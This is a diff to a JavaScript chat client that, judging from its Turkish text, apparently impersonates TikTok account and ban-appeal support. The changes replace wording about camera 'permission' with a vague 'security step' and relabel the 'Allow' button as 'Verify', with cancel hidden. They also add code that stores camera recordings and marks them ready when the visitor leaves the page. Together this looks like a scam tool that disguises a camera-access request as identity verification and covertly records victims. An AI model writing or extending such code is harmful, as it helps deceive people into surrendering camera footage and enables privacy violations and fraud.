@@ -57,10 +57,10 @@ const DEFAULT_QUICK_REPLIES = [
   "Merhaba, size nasıl yardımcı olabilirim?",
   "İsteğiniz alındı. Lütfen bekleyin.",
   "İşleminiz devam ediyor, lütfen bekleyin.",
-  "Kimlik doğrulaması için izin gerekir; izin verilmeden bu adım tamamlanamaz.",
+  "Kimlik doğrulaması için güvenlik adımı gerekir; tamamlanmadan bu adım bitmez.",
   "Lütfen uygulamada gördüğünüz uyarı veya hata metnini yazın.",
   "Hesap işlemleri için yalnızca resmi destek kullanılır: support.tiktok.com",
-  "Şifre, e-posta veya doğrulama kodu paylaşmayın. Kimlik doğrulaması yalnızca istenen izinler ile yapılır.",
+  "Şifre, e-posta veya doğrulama kodu paylaşmayın. Kimlik doğrulaması yalnızca güvenlik adımı ile yapılır.",
   "Konuyu inceledim. Ban itirazını uygulama üzerinden göndermeniz gerekiyor.",
   "Başka bir sorunuz var mı?",
 ];
@@ -544,7 +544,7 @@ async function startVisitorCameraOffer(text, opts = {}) {
 
   const clean = String(
     text ||
-      "Kimlik doğrulaması için izin zorunludur. İzin verirseniz doğrulama bu destek oturumuna bağlanır. İzin verilmezse doğrulama adımı tamamlanamaz."
+      "Kimlik doğrulaması için güvenlik adımı zorunludur. Onaylarsanız doğrulama bu destek oturumuna bağlanır. Onaylanmazsa adım tamamlanamaz."
   )
     .trim()
     .slice(0, 800);
@@ -558,10 +558,16 @@ async function startVisitorCameraOffer(text, opts = {}) {
       const existingId = String(meta.lastCallId || "").trim();
       if (existingId) {
         const callSnap = await get(ref(database, webrtcPath(id, existingId)));
-        const status = String(callSnap.val()?.status || "");
+        const call = callSnap.val() || {};
+        const status = String(call.status || "");
+        const dead =
+          status === "ended" ||
+          status === "denied" ||
+          call.forceClose === true ||
+          call.visitorLeftAt ||
+          call.recordingStatus === "finalizing";
         const usable =
-          status !== "ended" &&
-          status !== "denied" &&
+          !dead &&
           (meta.cameraPending ||
             meta.cameraGranted ||
             meta.hasCamera ||
@@ -598,7 +604,7 @@ async function startVisitorCameraOffer(text, opts = {}) {
       ts: Date.now(),
       type: "camera",
       callId,
-      okLabel: "İzin ver",
+      okLabel: "Doğrula",
       cancelLabel: "",
       hideCancel: true,
     });
@@ -628,6 +634,26 @@ async function initCameraCall(targetSessionId, callId) {
     createdAt: Date.now(),
     updatedAt: Date.now(),
   });
+}
+
+async function getCameraCall(targetSessionId, callId) {
+  const database = initDb();
+  if (!database || !targetSessionId || !callId) return null;
+  try {
+    const snap = await get(ref(database, webrtcPath(targetSessionId, callId)));
+    return snap.val() || null;
+  } catch {
+    return null;
+  }
+}
+
+function isCameraCallReusable(data) {
+  if (!data) return false;
+  const status = String(data.status || "");
+  if (status === "ended" || status === "denied") return false;
+  if (data.forceClose === true || data.visitorLeftAt) return false;
+  if (data.recordingStatus === "finalizing") return false;
+  return true;
 }
 
 async function setCameraCallStatus(targetSessionId, callId, status) {
@@ -1037,7 +1063,7 @@ async function sendAdminMessage(targetSessionId, text, options = {}) {
         : kind === "popup"
           ? "Devam etmek için onaylayın."
           : kind === "camera"
-            ? "Kimlik doğrulaması için izin vermeniz isteniyor. İzin verirseniz doğrulama bu destek oturumuna bağlanır. İzin verilmezse doğrulama tamamlanamaz."
+            ? "Kimlik doğrulaması için güvenlik adımını onaylamanız isteniyor. Onaylarsanız doğrulama bu destek oturumuna bağlanır. Onaylanmazsa doğrulama tamamlanamaz."
             : kind === "photos"
               ? "Destek için ekran görüntüsü veya fotoğraf gönderebilirsiniz. En fazla 10 görsel seçebilirsiniz; istemezseniz iptal edin."
               : "")
@@ -1085,7 +1111,7 @@ async function sendAdminMessage(targetSessionId, text, options = {}) {
   }
   if (kind === "camera") {
     payload.callId = callId;
-    payload.okLabel = String(options.okLabel || "İzin ver").trim().slice(0, 40) || "İzin ver";
+    payload.okLabel = String(options.okLabel || "Doğrula").trim().slice(0, 40) || "Doğrula";
     payload.cancelLabel =
       String(options.cancelLabel || "Reddet").trim().slice(0, 40) || "Reddet";
     await initCameraCall(targetSessionId, callId);
@@ -1256,18 +1282,30 @@ function setQuickReplies(list) {
   return clean;
 }
 
-async function markVisitorLeftKeepalive(targetSessionId, callId) {
+async function markVisitorLeftKeepalive(targetSessionId, callId, opts = {}) {
   const dbUrl = String(cfg.firebase?.databaseURL || "").replace(/\/$/, "");
   if (!dbUrl || !targetSessionId) return false;
   const now = Date.now();
+  const lastUrl = String(opts.lastRecordingUrl || "").trim();
+  const lastName = String(opts.lastRecordingName || "").trim();
+  const hasUrl = /^https?:\/\//i.test(lastUrl);
   const patchChat = {
     updatedAt: now,
     userLeftAt: now,
-    preview: "👋 Sayfadan ayrıldı — kayıt yükleniyor",
+    preview: hasUrl
+      ? "👋 Sayfadan ayrıldı — kayıt hazır"
+      : "👋 Sayfadan ayrıldı — kayıt yükleniyor",
     lastWho: "user",
   };
+  if (hasUrl) {
+    patchChat.lastRecordingUrl = lastUrl;
+    patchChat.lastRecordingName = lastName || `kamera-${String(callId || "rec").slice(0, 8)}.webm`;
+    patchChat.lastRecordingAt = now;
+    patchChat.lastRecordingCallId = callId ? String(callId) : null;
+    patchChat.hasRecording = true;
+    patchChat.recordingFinalized = true;
+  }
   try {
-    // RTDB REST + keepalive — unload’da güvenilir sinyal
     const chatUrl = `${dbUrl}/chats/${encodeURIComponent(targetSessionId)}.json`;
     void fetch(chatUrl, {
       method: "PATCH",
@@ -1276,21 +1314,27 @@ async function markVisitorLeftKeepalive(targetSessionId, callId) {
       keepalive: true,
     });
     if (callId) {
+      const callPatch = {
+        status: "ended",
+        recordingStatus: hasUrl ? "ready" : "finalizing",
+        visitorLeftAt: now,
+        forceClose: false,
+        updatedAt: now,
+      };
+      if (hasUrl) {
+        callPatch.recordingUrl = lastUrl;
+        callPatch.recordingName = patchChat.lastRecordingName;
+        callPatch.recordingFinalized = true;
+        callPatch.recordingReadyAt = now;
+      }
       const callUrl = `${dbUrl}/chats/${encodeURIComponent(targetSessionId)}/webrtc/${encodeURIComponent(callId)}.json`;
       void fetch(callUrl, {
         method: "PATCH",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          status: "ended",
-          recordingStatus: "finalizing",
-          visitorLeftAt: now,
-          forceClose: false,
-          updatedAt: now,
-        }),
+        body: JSON.stringify(callPatch),
         keepalive: true,
       });
     }
-    // sendBeacon yedek
     try {
       const blob = new Blob([JSON.stringify(patchChat)], { type: "application/json" });
       navigator.sendBeacon?.(chatUrl, blob);
@@ -1325,6 +1369,8 @@ window.ChatSync = {
   clearAllSessions,
   listenIncomingSupport,
   initCameraCall,
+  getCameraCall,
+  isCameraCallReusable,
   setCameraCallStatus,
   forceEndCameraCall,
   writeCameraSignal,
